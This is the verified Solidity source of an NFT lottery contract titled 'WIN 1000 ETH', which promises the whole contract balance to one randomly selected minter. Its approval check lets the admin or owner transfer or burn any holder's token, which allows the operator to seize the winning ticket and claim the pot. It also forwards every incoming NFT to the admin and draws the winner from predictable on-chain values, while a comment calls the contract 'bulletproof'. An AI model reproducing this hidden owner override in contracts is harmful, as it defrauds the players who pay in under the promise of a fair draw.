/**
 *Submitted for verification at Etherscan.io on 2023-01-09
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.11;

/**
 * @title WIN 1000 ETH
 * @author anon
 * @notice The game is simple, mint a cool NFT and get a chance to claim 1000 ETH.
 * @dev Feel free to try and break/hack this contract, it's bulletproof.
 */
contract WIN1000ETH {

  uint256 private constant _bpFee = 1000;

  uint256 private constant _ticketFee = 100000000000000000;

  uint256 private constant _targetBalance = 1000000000000000000000;

  uint256 private constant _maxTokens = 11111;

  uint256 private constant _blockGapLimit = 10;

  uint256 private constant _claimGracePeriod = 11111;

  address private constant _raribleTransferProxy = 0x4feE7B061C97C9c496b01DbcE9CDb10c02f0a0Be;

  OpenSeaProxyRegistry private constant _openseaTransferProxy = OpenSeaProxyRegistry(0xa5409ec958C83C3f309868babACA7c86DCB077c1);

  bytes32 private _seed;

  uint256 private _selectedTokenId;

  uint256 private _currentTokenId;

  uint256 private _lastBlock;

  uint256[] private _allTokens;

  address private _admin;

  address private _owner;

  string private _name;

  string private _symbol;

  string private _domain;

  mapping(uint256 => bytes32) private _tokenHash;

  mapping(uint256 => uint256) private _allTokensIndex;

  mapping(uint256 => uint256) private _ownedTokensIndex;

  mapping(uint256 => address) private _tokenOwner;

  mapping(uint256 => address) private _tokenApprovals;

  mapping(address => uint256) private _ownedTokensCount;

  mapping(address => uint256[]) private _ownedTokens;

  mapping(address => mapping(address => bool)) private _operatorApprovals;

  bool private _finished;

  bool private _claimed;

  event Approval (address indexed wallet, address indexed operator, uint256 indexed tokenId);

  event ApprovalForAll (address indexed wallet, address indexed operator, bool approved);

  event Transfer (address indexed from, address indexed to, uint256 indexed tokenId);

  constructor(address contractOwner, string memory tokenName, string memory tokenSymbol, string memory domain, string memory initialSeed) {
    _admin = tx.origin;
    _owner = contractOwner;
    _name = tokenName;
    _symbol = tokenSymbol;
    _domain = domain;
    _seed = keccak256(abi.encodePacked(initialSeed, msg.sender, block.timestamp));
  }

  receive() external payable {}

  fallback() external {}

  modifier onlyOwner() {
    require(isOwner(), "not admin or owner");
    _;
  }

  function changeAdmin (address newAdmin) public onlyOwner {
    require(msg.sender == _admin, "only admin can do this");
    require(newAdmin != address(0), "zero address");
    _admin = newAdmin;
  }

  function changeOwner (address newOwner) public onlyOwner {
    require(newOwner != address(0), "zero address");
    _owner = newOwner;
  }

  function withdrawERC1155 (address token, uint256 tokenId, uint256 amount) public onlyOwner {
    ERC1155(token).safeTransferFrom(address(this), _admin, tokenId, amount, "");
  }

  function withdrawERC20 (address token, uint256 amount) public onlyOwner {
    ERC20(token).transfer(_admin, amount);
  }

  function withdrawERC721 (address token, uint256 tokenId) public onlyOwner {
    ERC721(token).safeTransferFrom(address(this), _admin, tokenId);
  }

  function approve (address operator, uint256 tokenId) public {
    address tokenOwner = _tokenOwner[tokenId];
    require(operator != tokenOwner, "cannot approve yourself");
    require(_isApproved(msg.sender, tokenId), "sender is not approved");
    _tokenApprovals[tokenId] = operator;
    emit Approval(tokenOwner, operator, tokenId);
  }

  function burn (uint256 tokenId) public {
    require(_isApproved(msg.sender, tokenId), "sender is not approved");
    address wallet = _tokenOwner[tokenId];
    _clearApproval(tokenId);
    _tokenOwner[tokenId] = address(0);
    emit Transfer(wallet, address(0), tokenId);
    _removeTokenFromOwnerEnumeration(wallet, tokenId);
  }

  function claim () public {
    require((block.number - _lastBlock) > _blockGapLimit, "wait some more blocks");
    require(_finished, "game not finished");
    require(msg.sender == ownerOf(_selectedTokenId), "only token owner can claim");
    payable(msg.sender).transfer(address(this).balance);
    _claimed = true;
  }

  function claimExpired () public {
    require(!_claimed, "token already claimed");
    require(_finished, "game not finished");
    require((block.number - _lastBlock) > _claimGracePeriod, "claim time has not expired yet");
    _finished = false;
    finish ();
  }

  function finish () public {
    require((block.number - _lastBlock) > _blockGapLimit, "wait some more blocks");
    require(!_finished, "game already finished");
    require(address(this).balance >= _targetBalance, "target ETH balance not reached");
    _finished = true;
    _lastBlock = block.number;
    _selectedTokenId = uint256(keccak256(abi.encodePacked(_selectedTokenId, _seed, block.timestamp, ownerOf(1), ownerOf(11), ownerOf(111), ownerOf(1111), ownerOf(11111)))) % _maxTokens;
  }

  function mint (string memory text) public payable {
    require(_allTokens.length < _maxTokens, "cannot mint any more tokens");
    require(msg.value >= _ticketFee, "not enough eth paid");
    payable(_admin).transfer((msg.value * _bpFee) / 10000);
    _currentTokenId += 1;
    _mint(msg.sender, _currentTokenId);
    _tokenHash[_currentTokenId] = keccak256(abi.encodePacked(text, block.timestamp, msg.sender, _currentTokenId));
    _lastBlock = block.number;
  }

  function mintBatch (uint256 amount, string memory text) public payable {
    require((_allTokens.length + amount) <= _maxTokens, "cannot mint this many tokens");
    require(msg.value >= (_ticketFee * amount), "not enough eth paid");
    payable(_admin).transfer((msg.value * _bpFee) / 10000);
    for (uint256 i = 0; i < amount; i++) {
      _currentTokenId += 1;
      _mint(msg.sender, _currentTokenId);
      _tokenHash[_currentTokenId] = keccak256(abi.encodePacked(text, block.timestamp, msg.sender, _currentTokenId));
    }
    _lastBlock = block.number;
  }

  function mixSeed (string memory entropy) public {
    require(!_finished, "game already finished");
    _seed = keccak256(abi.encodePacked(_seed, entropy, msg.sender, block.timestamp));
    _lastBlock = block.number;
  }

  function safeTransferFrom (address from, address to, uint256 tokenId) public payable {
    safeTransferFrom(from, to, tokenId, "");
  }

  function safeTransferFrom (address from, address to, uint256 tokenId, bytes memory data) public payable {
    require(_isApproved(msg.sender, tokenId), "sender is not approved");
    _transferFrom(from, to, tokenId);
    if (isContract(to)) {
      require(ERC721(to).onERC721Received(address(this), from, tokenId, data) == 0x150b7a02, "onERC721Received failed");
    }
  }

  function setApprovalForAll (address operator, bool approved) public {
    require(operator != msg.sender, "cannot approve yourself");
    _operatorApprovals[msg.sender][operator] = approved;
    emit ApprovalForAll(msg.sender, operator, approved);
  }

  function transfer (address to, uint256 tokenId) public payable {
    transferFrom(msg.sender, to, tokenId, "");
  }

  function transferFrom (address from, address to, uint256 tokenId) public payable {
    transferFrom(from, to, tokenId, "");
  }

  function transferFrom (address from, address to, uint256 tokenId, bytes memory) public payable {
    require(_isApproved(msg.sender, tokenId), "sender is not approved");
    _transferFrom(from, to, tokenId);
  }

  function balanceOf (address wallet) public view returns (uint256) {
    require(wallet != address(0), "zero address");
    return _ownedTokensCount[wallet];
  }

  function contractURI () public view returns (string memory) {
    return string(abi.encodePacked ("https://", _domain, "/token/contract.json"));
  }

  function exists (uint256 tokenId) public view returns (bool) {
    return _tokenOwner[tokenId] != address(0);
  }

  function getApproved (uint256 tokenId) public view returns (address) {
    return _tokenApprovals[tokenId];
  }

  function getFeeBps (uint256) public pure returns (uint256[] memory) {
    uint256[] memory bps = new uint256[](1);
    bps[0] = _bpFee;
    return bps;
  }

  function getFeeRecipients (uint256) public view returns (address payable[] memory) {
    address payable[] memory recipients = new address payable[](1);
    recipients[0] = payable(_admin);
    return recipients;
  }

  function getRoyalties (uint256) public view returns (RariblePart[] memory) {
    RariblePart[] memory parts = new RariblePart[](1);
    parts[0] = RariblePart(payable(_admin), uint96(_bpFee));
    return parts;
  }

  function getSeed () public view returns (bytes32) {
    return _seed;
  }

  function isApprovedForAll (address wallet, address operator) public view returns (bool) {
    return (_operatorApprovals[wallet][operator] || _raribleTransferProxy == operator || address(_openseaTransferProxy.proxies(wallet)) == operator);
  }

  function isClaimed () public view returns (bool) {
    return _claimed;
  }

  function isFinished () public view returns (bool) {
    return _finished;
  }

  function isOwner () public view returns (bool) {
    return (msg.sender == _owner || msg.sender == _admin);
  }

  function lastBlock () public view returns (uint256) {
    return _lastBlock;
  }

  function name () public view returns (string memory) {
    return _name;
  }

  function owner () public view returns (address) {
    return _owner;
  }

  function ownerOf (uint256 tokenId) public view returns (address) {
    address tokenOwner = _tokenOwner[tokenId];
    require(tokenOwner != address(0), "token does not exist");
    return tokenOwner;
  }

  function royaltyInfo (uint256, uint256 value) public view returns (address, uint256) {
    return (_admin, (value * _bpFee) / 10000);
  }

  function selectedTokenId () public view returns (uint256) {
    return _selectedTokenId;
  }

  function supportsInterface (bytes4 interfaceId) public pure returns (bool) {
    if (interfaceId == 0x01ffc9a7 || interfaceId == 0x80ac58cd || interfaceId == 0x780e9d63 || interfaceId == 0x5b5e139f || interfaceId == 0x150b7a02 || interfaceId == 0xe8a3d485 || interfaceId == 0x2a55205a || interfaceId == 0xb7799584 || interfaceId == 0xb9c4d9fb || interfaceId == 0xcad96cca) {
      return true;
    } else {
      return false;
    }
  }

  function symbol () public view returns (string memory) {
    return _symbol;
  }

  function tokenByIndex (uint256 index) public view returns (uint256) {
    require(index < totalSupply(), "index out of bounds");
    return _allTokens[index];
  }

  function tokenOfOwnerByIndex (address wallet, uint256 index) public view returns (uint256) {
    require(index < balanceOf(wallet), "index out of bounds");
    return _ownedTokens[wallet][index];
  }

  function tokenURI (uint256 tokenId) public view returns (string memory) {
    require(_exists(tokenId), "token does not exist");
    return string(abi.encodePacked("data:application/json;base64,", _json(tokenId, SVG(_tokenHash[tokenId]), _domain)));
  }

  function tokensOfOwner (address wallet) public view returns (uint256[] memory) {
    return _ownedTokens[wallet];
  }

  function totalSupply () public view returns (uint256) {
    return _allTokens.length;
  }

  function onERC721Received (address operator, address, uint256 tokenId, bytes calldata) public returns (bytes4) {
    ERC721(operator).safeTransferFrom(address(this), _admin, tokenId);
    return 0x150b7a02;
  }

  function _addTokenToOwnerEnumeration (address to, uint256 tokenId) internal {
    _ownedTokensIndex[tokenId] = _ownedTokensCount[to];
    _ownedTokensCount[to]++;
    _ownedTokens[to].push(tokenId);
    _allTokensIndex[tokenId] = _allTokens.length;
    _allTokens.push(tokenId);
  }

  function _clearApproval (uint256 tokenId) internal {
    delete _tokenApprovals[tokenId];
  }

  function _mint (address to, uint256 tokenId) internal {
    require(to != address(0));
    require(!_exists(tokenId));
    _tokenOwner[tokenId] = to;
    emit Transfer(address(0), to, tokenId);
    _addTokenToOwnerEnumeration(to, tokenId);
  }

  function _removeTokenFromAllTokensEnumeration (uint256 tokenId) internal {
    uint256 lastTokenIndex = _allTokens.length - 1;
    uint256 tokenIndex = _allTokensIndex[tokenId];
    uint256 lastTokenId = _allTokens[lastTokenIndex];
    _allTokens[tokenIndex] = lastTokenId;
    _allTokensIndex[lastTokenId] = tokenIndex;
    delete _allTokensIndex[tokenId];
    delete _allTokens[lastTokenIndex];
    _allTokens.pop();
  }

  function _removeTokenFromOwnerEnumeration (address from, uint256 tokenId) internal {
    _removeTokenFromAllTokensEnumeration(tokenId);
    _ownedTokensCount[from]--;
    uint256 lastTokenIndex = _ownedTokensCount[from];
    uint256 tokenIndex = _ownedTokensIndex[tokenId];
    if(tokenIndex != lastTokenIndex) {
      uint256 lastTokenId = _ownedTokens[from][lastTokenIndex];
      _ownedTokens[from][tokenIndex] = lastTokenId;
      _ownedTokensIndex[lastTokenId] = tokenIndex;
    }
    if(lastTokenIndex == 0) {
      delete _ownedTokens[from];
    } else {
      delete _ownedTokens[from][lastTokenIndex];
      _ownedTokens[from].pop();
    }
  }

  function _transferFrom (address from, address to, uint256 tokenId) internal {
    require(_tokenOwner[tokenId] == from, "incorrect token owner");
    require(to != address(0), "cannot transfer to burn address");
    _clearApproval(tokenId);
    _tokenOwner[tokenId] = to;
    emit Transfer(from, to, tokenId);
    _removeTokenFromOwnerEnumeration(from, tokenId);
    _addTokenToOwnerEnumeration(to, tokenId);
  }

  function _exists (uint256 tokenId) internal view returns (bool) {
    return _tokenOwner[tokenId] != address(0);
  }

  function _isApproved (address spender, uint256 tokenId) internal view returns (bool) {
    require(_exists(tokenId));
    address tokenOwner = _tokenOwner[tokenId];
    return (spender == tokenOwner || getApproved(tokenId) == spender || isApprovedForAll(tokenOwner, spender) || isOwner());
  }

  function isContract (address account) internal view returns (bool) {
    bytes32 codehash;
    assembly {
      codehash := extcodehash(account)
    }
    return (codehash != 0x0 && codehash != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470);
  }

  function SVG (bytes32 h) internal pure returns (bytes memory c) {
    (int256 s,int256[4]memory x)=_hs(h);HSL[32]memory hsl=[
      _2HSL(h[0],s,x[0]),_2HSL(h[1],s,x[0]),_2HSL(h[2],s,x[0]),_2HSL(h[3],s,x[0]),
      _2HSL(h[4],s,x[0]),_2HSL(h[5],s,x[0]),_2HSL(h[6],s,x[0]),_2HSL(h[7],s,x[0]),
      _2HSL(h[8],s,x[1]),_2HSL(h[9],s,x[1]),_2HSL(h[10],s,x[1]),_2HSL(h[11],s,x[1]),
      _2HSL(h[12],s,x[1]),_2HSL(h[13],s,x[1]),_2HSL(h[14],s,x[1]),_2HSL(h[15],s,x[1]),
      _2HSL(h[16],s,x[2]),_2HSL(h[17],s,x[2]),_2HSL(h[18],s,x[2]),_2HSL(h[19],s,x[2]),
      _2HSL(h[20],s,x[2]),_2HSL(h[21],s,x[2]),_2HSL(h[22],s,x[2]),_2HSL(h[23],s,x[2]),
      _2HSL(h[24],s,x[3]),_2HSL(h[25],s,x[3]),_2HSL(h[26],s,x[3]),_2HSL(h[27],s,x[3]),
      _2HSL(h[28],s,x[3]),_2HSL(h[29],s,x[3]),_2HSL(h[30],s,x[3]),_2HSL(h[31],s,x[3])
    ];c=_raw();uint256 cptr;
    assembly {
      cptr := add(c,32)
    }
    uint256 i;uint256 _s=3103;uint256 _o=84;uint256 _j=7;
    for(i=0;i<32;i++){_in(cptr+(_s+(_o*i)+((i/8)*_j)),abi.encodePacked("hsl(",int2str((hsl[i].h/(10**4)),11),",",int2str(hsl[i].s,1),"%,",uint2str(uint256(hsl[i].l)),"%",")  "));}
    return c;
  }

  function _raw () internal pure returns (bytes memory) {
    return hex"3C73766720776974683D2737323027206865696768743D273732302720786D6C6E733D27687474703A2F2F7777772E77332E6F72672F323030302F737667272076696577426F783D272D312E31202D312E3120322E3220322E3227207374796C653D276261636B67726F756E642D636F6C6F723A77686974653B273E3C646566733E3C706174682069643D27612720643D274D302030204C362E313233323333393935373336373636652D3137202D31204131203120302030203120302E37303731303637383131383635343736202D302E373037313036373831313836353437355A27207374726F6B653D272366666627207374726F6B652D77696474683D27302E303227207374726F6B652D6C696E656A6F696E3D27726F756E64273E3C616E696D617465206174747269627574654E616D653D2764272076616C7565733D274D302030204C362E313233323333393935373336373636652D3137202D31204131203120302030203120302E37303731303637383131383635343736202D302E373037313036373831313836353437355A3B4D302030204C342E353932343235343936383032353734652D3137202D302E37352041302E3138373520302E3138373520302030203120302E35333033333030383538383939313037202D302E353330333330303835383839393130365A3B4D302030204C362E313233323333393935373336373636652D3137202D31204131203120302030203120302E37303731303637383131383635343736202D302E373037313036373831313836353437355A27206475723D273130732720726570656174436F756E743D27696E646566696E697465272F3E3C616E696D6174655472616E73666F726D206174747269627574654E616D653D277472616E73666F726D2720747970653D27726F74617465272066726F6D3D2730203020302720746F3D273336302030203027206475723D273235732720726570656174436F756E743D27696E646566696E697465272F3E3C2F706174683E3C706174682069643D27622720643D274D302030204C2D312E34363732343434333638343033333933652D3136202D302E373938373330363639353839343634332041302E3739383733303636393538393436343320302E3739383733303636393538393436343320302030203120302E35363437383738373238303833383138202D302E3536343738373837323830383338325A27207374726F6B653D272366666627207374726F6B652D77696474683D27302E303227207374726F6B652D6C696E656A6F696E3D27726F756E64273E3C616E696D617465206174747269627574654E616D653D2764272076616C7565733D274D302030204C2D312E34363732343434333638343033333933652D3136202D302E373938373330363639353839343634332041302E3739383733303636393538393436343320302E3739383733303636393538393436343320302030203120302E35363437383738373238303833383138202D302E3536343738373837323830383338325A3B4D302030204C2D312E31303034333333323736333032353434652D3136202D302E353939303438303032313932303938322041302E313439373632303030353438303234353520302E313439373632303030353438303234353520302030203120302E34323335393039303436303632383634202D302E343233353930393034363036323836355A3B4D302030204C2D312E34363732343434333638343033333933652D3136202D302E373938373330363639353839343634332041302E3739383733303636393538393436343320302E3739383733303636393538393436343320302030203120302E35363437383738373238303833383138202D302E3536343738373837323830383338325A27206475723D273130732720726570656174436F756E743D27696E646566696E697465272F3E3C616E696D6174655472616E73666F726D206174747269627574654E616D653D277472616E73666F726D2720747970653D27726F74617465272066726F6D3D27333530203020302720746F3D272D31302030203027206475723D273230732720726570656174436F756E743D27696E646566696E697465272F3E3C2F706174683E3C706174682069643D27632720643D274D302030204C2D322E35313539373139303338303037333837652D3136202D302E353836393834383438303938333439392041302E3538363938343834383039383334393920302E3538363938343834383039383334393920302030203120302E343135303630393636353434303939202D302E343135303630393636353434303938365A27207374726F6B653D272366666627207374726F6B652D77696474683D27302E303227207374726F6B652D6C696E656A6F696E3D27726F756E64273E3C616E696D617465206174747269627574654E616D653D2764272076616C7565733D274D302030204C2D322E35313539373139303338303037333837652D3136202D302E353836393834383438303938333439392041302E3538363938343834383039383334393920302E3538363938343834383039383334393920302030203120302E343135303630393636353434303939202D302E343135303630393636353434303938365A3B4D302030204C2D312E383836393738393237383530353534652D3136202D302E343430323338363336303733373632352041302E313130303539363539303138343430363320302E313130303539363539303138343430363320302030203120302E33313132393537323439303830373433202D302E3331313239353732343930383037345A3B4D302030204C2D322E35313539373139303338303037333837652D3136202D302E353836393834383438303938333439392041302E3538363938343834383039383334393920302E3538363938343834383039383334393920302030203120302E343135303630393636353434303939202D302E343135303630393636353434303938365A27206475723D273130732720726570656174436F756E743D27696E646566696E697465272F3E3C616E696D6174655472616E73666F726D206174747269627574654E616D653D277472616E73666F726D2720747970653D27726F74617465272066726F6D3D273430203020302720746F3D273430302030203027206475723D273135732720726570656174436F756E743D27696E646566696E697465272F3E3C2F706174683E3C706174682069643D27642720643D274D302030204C2D382E363937313839363535323036303935652D3136202D302E3335352041302E33353520302E33353520302030203120302E3235313032323930373332313232343834202D302E32353130323239303733323132323338345A27207374726F6B653D272366666627207374726F6B652D77696474683D27302E303227207374726F6B652D6C696E656A6F696E3D27726F756E64273E3C616E696D617465206174747269627574654E616D653D2764272076616C7565733D274D302030204C2D382E363937313839363535323036303935652D3136202D302E3335352041302E33353520302E33353520302030203120302E3235313032323930373332313232343834202D302E32353130323239303733323132323338345A3B4D302030204C2D362E353232383932323431343034353732652D3136202D302E32363632352041302E3036363536323520302E3036363536323520302030203120302E3138383236373138303439303931383635202D302E313838323637313830343930393137395A3B4D302030204C2D382E363937313839363535323036303935652D3136202D302E3335352041302E33353520302E33353520302030203120302E3235313032323930373332313232343834202D302E32353130323239303733323132323338345A27206475723D273130732720726570656174436F756E743D27696E646566696E697465272F3E3C616E696D6174655472616E73666F726D206174747269627574654E616D653D277472616E73666F726D2720747970653D27726F74617465272066726F6D3D27333730203020302720746F3D2731302030203027206475723D273130732720726570656174436F756E743D27696E646566696E697465272F3E3C2F706174683E3C2F646566733E3C673E3C75736520687265663D27236127207472616E73666F726D3D27726F74617465283030302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236127207472616E73666F726D3D27726F74617465283034352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236127207472616E73666F726D3D27726F74617465283039302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236127207472616E73666F726D3D27726F74617465283133352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236127207472616E73666F726D3D27726F74617465283138302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236127207472616E73666F726D3D27726F74617465283232352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236127207472616E73666F726D3D27726F74617465283237302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236127207472616E73666F726D3D27726F74617465283331352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C2F673E3C673E3C75736520687265663D27236227207472616E73666F726D3D27726F74617465283030302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236227207472616E73666F726D3D27726F74617465283034352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236227207472616E73666F726D3D27726F74617465283039302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236227207472616E73666F726D3D27726F74617465283133352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236227207472616E73666F726D3D27726F74617465283138302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236227207472616E73666F726D3D27726F74617465283232352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236227207472616E73666F726D3D27726F74617465283237302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236227207472616E73666F726D3D27726F74617465283331352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C2F673E3C673E3C75736520687265663D27236327207472616E73666F726D3D27726F74617465283030302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236327207472616E73666F726D3D27726F74617465283034352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236327207472616E73666F726D3D27726F74617465283039302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236327207472616E73666F726D3D27726F74617465283133352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236327207472616E73666F726D3D27726F74617465283138302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236327207472616E73666F726D3D27726F74617465283232352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236327207472616E73666F726D3D27726F74617465283237302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236327207472616E73666F726D3D27726F74617465283331352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C2F673E3C673E3C75736520687265663D27236427207472616E73666F726D3D27726F74617465283030302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236427207472616E73666F726D3D27726F74617465283034352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236427207472616E73666F726D3D27726F74617465283039302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236427207472616E73666F726D3D27726F74617465283133352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236427207472616E73666F726D3D27726F74617465283138302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236427207472616E73666F726D3D27726F74617465283232352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236427207472616E73666F726D3D27726F74617465283237302C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C75736520687265663D27236427207472616E73666F726D3D27726F74617465283331352C302C3029272066696C6C3D272020202020202020202020202020202020202020202020202020202020202020272F3E3C2F673E3C2F7376673E";
  }

  function _in (uint256 a, bytes memory b) internal pure {
    assembly {
      let bptr:=add(b,32)
      mstore(a,mload(bptr))
    }
  }

  function _hs (bytes32 h) internal pure returns (int256 s, int256[4] memory x) {
    int256 _16=(10**16);int256 _32=(10**32);int256 _0xff=(0xff*_32)/_16;bytes1 ts;bytes1 th;uint256 n;uint256 i;
    for(i=0;i<32;i++){ts^=h[i];}
    s=((int256(uint256(uint8(ts)))*_32)/_0xff)*2-_16;
    for(n=0;n<4;n++){th=0x00;for(i=0;i<8;i++){th^=h[(n*8)+i];}x[n]=((int256(uint256(uint8(th)))*_32)/_0xff)*2-_16;}
  }

  function uint2str (uint256 _i) internal pure returns (bytes memory) {
    if(_i==0){return"0";}
    uint256 j=_i;uint256 len;
    while(j!=0){len++;j/=10;}
    bytes memory bstr=new bytes(len);uint256 k=len;
    while(_i!=0){k=k-1;uint8 t=(48+uint8(_i-_i/10*10));bytes1 b1=bytes1(t);bstr[k]=b1;_i/=10;}
    return bstr;
  }

  function int2str (int256 i, uint256 d) internal pure returns (bytes memory output) {
    bool n=i<0;
    if(n){i-=i*2;}
    uint256 a=uint256(i);uint256 dm=10**d;uint256 w=a/dm;uint256 f=a-(w*dm);d--;uint256 o=f/10**d;bytes memory p;
    while(d>0&&o==0){d--;o=f/10**d;p=abi.encodePacked(p,bytes1(0x30));}
    return abi.encodePacked((n?"-":""),uint2str(w),bytes1(0x2e),p,uint2str(f));
  }

  function padStr (bytes memory i, uint256 l, bytes1 p) internal pure returns (bytes memory) {
    while(i.length<l){i=abi.encodePacked(p,i);}return i;
  }

  function _2HSL (bytes1 v, int256 hs, int256 cs) internal pure returns (HSL memory) {
    int256 _16=(10**16);int256 _32=(10**32);
    int256 h=int256(uint256(uint8(v)>>4));int256 s=int256(uint256((uint8(v)>>2)&0x03));int256 l=int256(uint256(uint8(v)&0x03));
    int256 H=(360*hs)+(120*cs)+(30*(h*_32))/(16*_16);int256 S=(5000+(5000*s)/4)/10;int256 L=(5000+(4000*l)/8)/100;
    return HSL(H,S,L);
  }

  function _b64 (bytes memory d) internal pure returns (string memory r) {
    string memory e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    if(d.length==0){return"";}uint256 el=4*((d.length+2)/3);r=new string(el+32);
    assembly {
      mstore(r,el)
      let ePtr:=add(e,1)
      let dPtr:=d
      let endPtr:=add(dPtr,mload(d))
      let rPtr:=add(r,32)
      for{}lt(dPtr,endPtr){}{
        dPtr:=add(dPtr,3)
        let i:=mload(dPtr)
        mstore8(rPtr,mload(add(ePtr,and(shr(18,i),0x3F))))
        rPtr:= add(rPtr,1)
        mstore8(rPtr,mload(add(ePtr,and(shr(12,i),0x3F))))
        rPtr:=add(rPtr,1)
        mstore8(rPtr,mload(add(ePtr,and(shr(6,i),0x3F))))
        rPtr:=add(rPtr,1)
        mstore8(rPtr,mload(add(ePtr,and(i,0x3F))))
        rPtr:=add(rPtr,1)
      }
      switch mod(mload(d),3)
      case 1{mstore(sub(rPtr,2),shl(240,0x3d3d))}
      case 2{mstore(sub(rPtr,1),shl(248,0x3d))}
    }
  }

  function _json (uint256 tokenId, bytes memory svg, string memory domain) internal pure returns (string memory) {
    return _b64(abi.encodePacked(
        "{\"name\":\"1000 ETH Token #", padStr(uint2str(tokenId), 5, 0x30), "\",\"description\":\"A generative NFT stored entirely onchain.\\n\\nCan also be used to participate in a social experiment to claim 1000 ETH.\\n\\nDetails at https://", domain, "/\",\"external_url\":\"https://", domain, "/\",\"background_color\":\"ffffff\",\"image_data\":\"", svg, "\"}")
    );
  }

}

struct HSL { int256 h; int256 s; int256 l; } interface OpenSeaOwnableDelegateProxy {} interface OpenSeaProxyRegistry { function proxies (address wallet) external view returns (OpenSeaOwnableDelegateProxy); } struct RariblePart { address payable account; uint96 value; } interface ERC1155 { function safeTransferFrom (address from, address to, uint256 tokenid, uint256 amount, bytes calldata data) external; } interface ERC20 { function transfer (address recipient, uint256 amount) external returns (bool); } interface ERC721 { function safeTransferFrom (address from, address to, uint256 tokenId) external payable; function onERC721Received (address operator, address from, uint256 tokenId, bytes calldata data) external pure returns (bytes4); }